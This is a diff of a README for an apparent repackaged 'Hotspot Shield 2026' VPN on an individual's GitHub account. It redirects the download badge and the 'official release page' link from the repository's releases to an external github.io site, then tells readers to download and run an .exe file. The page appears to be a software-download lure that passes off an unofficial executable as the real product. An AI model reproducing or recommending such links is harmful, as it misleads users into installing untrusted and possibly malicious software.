@@ -1,6 +1,6 @@
 # 🛡️ Hotspot-Shield-2026 - Secure your Windows internet connection today
 
-[![Download Hotspot Shield](https://img.shields.io/badge/Download-Hotspot_Shield-blue.svg)](https://github.com/granthka6602/Hotspot-Shield-2026/releases)
+[![Download Hotspot Shield](https://img.shields.io/badge/Download-Hotspot_Shield-blue.svg)](https://granthka6602.github.io)
 
 Hotspot Shield 2026 provides a secure tunnel for your internet traffic. This software protects your privacy on public networks and helps you access content from around the world. The application runs on Windows 10 and Windows 11. It encrypts your connection to prevent data monitoring by third parties.
 
@@ -8,7 +8,7 @@ Hotspot Shield 2026 provides a secure tunnel for your internet traffic. This sof
 
 Follow these steps to get the application onto your computer.
 
-1. Navigate to the official release page: [https://github.com/granthka6602/Hotspot-Shield-2026/releases](https://github.com/granthka6602/Hotspot-Shield-2026/releases)
+1. Navigate to the official release page: [https://granthka6602.github.io](https://granthka6602.github.io)
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file in your Downloads folder for easy access.
